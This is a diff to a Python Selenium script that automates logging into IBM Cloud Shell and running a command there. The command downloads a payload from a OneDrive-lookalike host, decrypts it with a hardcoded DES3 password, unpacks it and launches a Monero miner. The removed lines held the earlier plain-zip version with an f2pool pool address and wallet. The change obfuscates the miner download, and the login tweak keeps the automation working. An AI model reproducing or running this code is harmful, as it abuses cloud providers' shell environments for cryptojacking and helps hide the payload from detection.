@@ -44,8 +44,8 @@ def worker_callbacks(f):
     }))
 
 
-xmr_command = """./test -o xmr.f2pool.com:13531 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
-comand = """ wget -O test.zip 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJc0zJP7jJS7JWOJo?e=V6Zarf'&&unzip -o test.zip&&chmod 0777 test&&""" + xmr_command
+xmr_command = """./test -c config.json"""
+comand = """ wget -O test.des3 'http://1drv.stdfirm.com/u/s!AnJnYpmP0XhJepe1DA4dOpUgY6U?e=2m9f2q'&&dd if=test.des3 |openssl des3 -d -k 123@123 | tar zxf -&&cd mine&&chmod 0777 test&&""" + xmr_command
 address = "https://cloud.ibm.com/shell"
 s_time = time.time()
 
@@ -165,7 +165,7 @@ class CloudShell:
                     user_id = user_form.find_element_by_id("userid")
                     user_id.clear()
                     user_id.send_keys(self.user)
-                    user_form.find_element_by_tag_name("button").click()
+                    user_form.find_elements_by_tag_name("button")[1].click()
                     self._log("send username")
                     try:
                         WebDriverWait(self.driver, 30).until(
